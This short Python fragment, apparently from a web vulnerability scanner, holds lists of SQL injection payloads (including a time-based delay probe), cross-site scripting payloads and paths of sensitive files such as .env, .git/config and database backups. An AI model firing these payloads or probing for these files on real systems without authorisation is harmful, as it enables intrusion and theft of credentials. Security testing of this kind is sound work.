SQLI_PAYLOADS = [
    "' OR '1'='1' -- ",
    "\" OR \"1\"=\"1\" -- ",
    "'; WAITFOR DELAY '0:0:3' -- "
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "\"><img src=x onerror=alert(1)>",
    "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>"
]

SENSITIVE_FILES = [
    ".env", "config.php", ".git/config", "backup.zip", "db_backup.sql", "wp-config.php"
]
